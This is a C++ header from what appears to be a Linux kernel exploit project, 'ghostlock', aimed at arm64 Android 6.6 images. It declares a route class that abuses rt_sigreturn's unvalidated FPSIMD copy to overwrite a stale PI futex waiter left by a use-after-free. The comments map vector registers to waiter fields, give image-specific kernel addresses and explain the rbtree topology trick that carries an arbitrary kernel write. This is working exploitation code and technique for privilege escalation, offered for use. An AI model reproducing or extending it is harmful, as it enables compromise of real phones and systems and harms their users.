#ifndef RT_SIGRETURN_ROUTE_H
#define RT_SIGRETURN_ROUTE_H

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "race/pi_race.h"
#include "route/route_status.h"
#include "support/native_resource.hpp"

#include <signal.h>

#include <cstdint>

/* Device-specific middleware for 6.6 images whose stale PI futex waiter sits
 * outside both the pselect fd_set window (select_stack) and the reachable tail
 * of __sys_sendmsg's iovec array (sendmsg_iovec).
 *
 * __arm64_sys_rt_sigreturn copies the 0x200-byte FPSIMD save area of the user
 * signal frame onto its own kernel stack at sp+0x50, with no validation of the
 * copied bytes. On the adapted image that region contains the whole stale
 * rt_mutex_waiter, so the vector registers become waiter fields:
 *
 *   v18.d[0] -> waiter+0x50 (task)
 *   v18.d[1] -> waiter+0x58 (lock)
 *   v19.d[0] -> waiter+0x60 (wake_state, low 32 bits)
 *   v19.d[1] -> waiter+0x68 (ww_ctx)
 *   v13..v17 -> waiter+0x00..0x50 (tree/pi_tree) - defined, not left live
 *
 * Trigger (CVE-2026-43499 / GhostLock, v2.6.39-rc1..v7.1): the proxy-lock
 * rollback in remove_waiter() clears current->pi_blocked_on, but there current is
 * the requeuer, so the waiter task's pi_blocked_on keeps pointing at its popped
 * stack waiter. This image (6.6.58) has the unpatched remove_waiter
 * (0x108b7c8 mrs sp_el0, 0x108b818 str xzr,[x20,#0x938]); the fix
 * (3bfdc63936dd) stores to waiter->task instead. The consumer's sched_setattr
 * then walks that dangling pointer. See docs/analysis/rt-sigreturn-route.md 5.1.
 *
 * tree/pi_tree are written as a zero rb node. Under Linux rbtree semantics a
 * zero node is NOT RB_EMPTY_NODE (that needs parent_color == the node address),
 * so the walk treats it as a real (parent/left/right 0, black) node and the
 * erase/relink of that topology is load-bearing. The crafted rb nodes that carry
 * the write target/value live in the payload page that waiter->lock redirects
 * the walk into. This is a structural argument from android15-6.6 common, not a
 * proof on this image or device. Geometry evidence lives in
 * docs/analysis/rt-sigreturn-route.md. */
namespace ghostlock::route::rt_sigreturn {
    /* Safety backstop for the freeze wait. The route waits for the consumer with
     * no deadline of its own once the single stamp is done, so this bounds the
     * spin if the profile gives neither a max-call budget nor a timeout. */
    inline constexpr int32_t kRtSigreturnMaxWaitSpins = 1 << 24;

    /* Signal used to drive one rt_sigreturn() per stamp. SIGURG has a harmless
     * default action and is not used for synchronisation by the kernel or ART. */
    inline constexpr int32_t kStampSignalNumber = SIGURG;

    class RtSigreturnRoute final {
    public:
        RtSigreturnRoute(ghostlock::race::PiRace *race,
                         const ghostlock::memory::WriteRequest *request,
                         const ghostlock::profile::TargetProfile &profile) noexcept;

        ~RtSigreturnRoute() noexcept = default;

        RtSigreturnRoute(const RtSigreturnRoute &) = delete;

        RtSigreturnRoute &operator=(const RtSigreturnRoute &) = delete;

        RtSigreturnRoute(RtSigreturnRoute &&other) noexcept;

        /* Install the no-op stamp signal handler and unblock the signal on this
         * thread. No consumer trigger is armed until this returns 0. */
        [[nodiscard]] int32_t prepare() noexcept;

        /* Stamp the waiter through rt_sigreturn() while the consumer fires. */
        [[nodiscard]] ghostlock::route::RouteStatus execute() noexcept;

        /* Stop the consumer trigger and bounded-drain it; a consumer still in
         * flight marks the route dirty. */
        void disarm() noexcept;

        /* Restore the signal disposition and mask once. */
        void destroy() noexcept;

        [[nodiscard]] int32_t fail(int32_t step, int32_t error_number) noexcept;

        ghostlock::race::PiRace *race = nullptr;
        const ghostlock::memory::WriteRequest *request = nullptr;
        const ghostlock::profile::TargetProfile &profile;
        struct sigaction old_action {};
        sigset_t old_mask {};
        int32_t action_installed = 0;
        int32_t mask_installed = 0;
        int32_t consumer_stuck = 0;
        int32_t calls = 0;
        int32_t successes = 0;
        int32_t stamps = 0;
        int32_t stamp_result = 0;
        int32_t stamp_errno = 0;
        ghostlock::route::RouteStatus status{};
    };
} // namespace ghostlock::route::rt_sigreturn

#endif
